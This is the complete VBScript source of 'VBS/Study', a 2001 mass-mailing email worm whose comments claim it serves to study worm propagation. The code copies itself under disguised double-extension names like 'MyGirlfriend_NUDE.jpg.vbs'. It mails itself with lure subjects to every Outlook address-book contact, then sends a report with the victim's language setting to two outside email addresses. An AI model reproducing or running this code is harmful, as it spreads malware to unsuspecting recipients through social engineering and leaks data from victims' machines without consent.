'VBS/Study by PetiK     ©2001.                              15/02/2001
'Merci à FireBurn, Melissa, Monopoly et Prolin
'Ce programme permet d'étudier la propagation des vers.
'To study the propagation of worms.
Set fso = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
Set O = CreateObject("Outlook.application")
Set mapi = O.GetNameSpace("MAPI")
For Each AddList In mapi.AddressLists
If AddList.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AddList.AddressEntries.Count
Set AddListEntry = AddList.AddressEntries(AddListCount)
Set msg = O.CreateItem(0)
msg.To = AddListEntry.Address
Randomize
Num = Int((4*Rnd)+1)
Set c = fso.GetFile(WScript.ScriptFullName)

If num = 1 Then
c.Copy(fso.GetSpecialFolder(0)&"\MyGirlfriend_NUDE.jpg.vbs")
msg.Subject = "Hi, how are you ?"
msg.Body = "Hi, look at this nice Pic attached !"
msg.Attachments.add fso.BuildPath(fso.GetSpecialFolder(0),"MyGirlfriend_NUDE.jpg.vbs")

elseif num = 2 Then
c.Copy(fso.GetSpecialFolder(0)&"\Winword.doc.vbs")
msg.Subject = "Important Message"
msg.Body =  vbCrLf & "Here is that document you asked"
msg.Attachments.add fso.BuildPath(fso.GetSpecialFolder(0),"Winword.doc.vbs")

elseif num = 3 Then
c.Copy(fso.GetSpecialFolder(0)&"\MONOPOLY.VBS")
msg.Subject = "Bill Gates joke"
msg.Body = "Bill Gates is guitly of monopoly. Here is the proof. :-)"
msg.Attachments.add fso.BuildPath(fso.GetSpecialFolder(0),"MONOPOLY.VBS")

elseif num = 4 Then
c.Copy(fso.GetSpecialFolder(0)&"\CREATIVE.exe.vbs")
msg.Subject = "A great Shockwave flash movie"
msg.Body = "Check out this new flash movie that I download just now... It's Great."
msg.Attachments.add fso.BuildPath(fso.GetSpecialFolder(0),"CREATIVE.exe.vbs")
End If
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next

Set msg2 = O.CreateItem(0)
msg2.BCC = "Panda34@caramail.com; Pentasm99@aol.com"
PAYS = ws.RegRead("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage")
msg2.Subject = "VBS/Study arrivant de " & PAYS
msg2.Send
